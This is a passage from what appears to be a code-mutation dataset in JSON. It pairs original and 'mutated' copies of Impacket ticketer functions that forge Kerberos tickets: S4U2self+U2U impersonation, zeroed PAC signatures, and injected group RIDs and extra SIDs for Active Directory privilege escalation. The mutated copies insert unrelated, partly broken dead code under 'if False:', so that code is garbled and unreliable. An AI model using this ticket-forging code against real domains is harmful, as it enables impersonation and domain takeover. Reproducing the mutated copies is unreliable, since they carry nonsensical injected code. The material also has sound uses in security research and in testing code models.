tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)",
            "def getKerberosS4U2SelfU2U(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    tgt = self.__tgt\n    cipher = self.__tgt_cipher\n    sessionKey = self.__tgt_session_key\n    kdcHost = self.__options.dc_ip\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.renewable_ok.value)\n    opts.append(constants.KDCOptions.enc_tkt_in_skey.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__options.user, self.__options.domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    return (r, None, sessionKey, None)"
        ]
    },
    {
        "func_name": "customizeTicket",
        "original": "def customizeTicket(self, kdcRep, pacInfos):\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)",
        "mutated": [
            "def customizeTicket(self, kdcRep, pacInfos):\n    if False:\n        i = 10\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    